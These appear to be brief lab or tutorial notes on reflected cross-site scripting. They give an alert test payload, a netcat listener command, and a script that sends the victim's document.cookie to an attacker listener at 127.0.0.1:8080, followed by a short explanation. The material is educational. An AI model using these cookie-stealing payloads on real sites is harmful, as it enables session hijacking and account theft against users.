Paste this in the input field:
```
<script>alert('XSS - reflected')</script>
```

for session cookie, you have to listen on local machine to receive cookies

we use `netcat`. Open terminal and rn `nc -lvnp 8080`

This starts listening on the 8080 port then.

now, use this script:
```
<script>document.location='http://127.0.0.1:8080/cookie.php?c='+document.cookie;</script>
```
document.location redirects the browser, here we will redirect it to our server (specifically the 8080 port netcat is listening on). the cookie.php

What is reflected XSS?

Its basically a xss where you are sending a script to the server, the server reflects the script back at the browser as is (it does not reach inside the server) and the browser thinks the server sent the script, so it executes it.
in the above example, we simply made the browser send the cookie to a cookie.php which is the attacker at 127.0.0.1:8080, which is watched by a netcat.